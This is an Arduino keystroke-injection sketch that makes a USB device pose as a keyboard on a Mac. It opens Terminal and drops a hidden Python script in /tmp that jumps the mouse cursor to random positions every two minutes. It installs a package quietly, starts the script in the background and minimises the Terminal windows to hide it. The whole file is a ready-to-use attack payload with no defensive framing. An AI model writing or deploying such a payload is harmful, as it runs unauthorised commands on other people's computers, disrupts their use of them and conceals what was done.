#include <Keyboard.h>

void t(const char* s) { for(int i=0;s[i];i++){Keyboard.write(s[i]);delay(5);} }
void ln(const char* s) { t(s); Keyboard.write(KEY_RETURN); delay(30); }

void setup() {
  delay(2500); Keyboard.begin(); delay(500);
  Keyboard.press(KEY_LEFT_GUI); Keyboard.press(' ');
  delay(100); Keyboard.releaseAll(); delay(1200);
  t("Terminal"); delay(500);
  Keyboard.write(KEY_RETURN); delay(4000);
  ln("cat>/tmp/.j.py<<'E'");
  delay(300);
  ln("from Quartz import CGWarpMouseCursorPosition");
  ln("import time,random");
  ln("while 1:");
  ln(" time.sleep(120)");
  ln(" CGWarpMouseCursorPosition((random.randint(0,2560),random.randint(0,1600)))");
  ln("E");
  delay(500);
  ln("python3 -m pip install pyobjc-framework-Quartz -q;nohup python3 /tmp/.j.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'");
  Keyboard.end();
}
void loop() {}
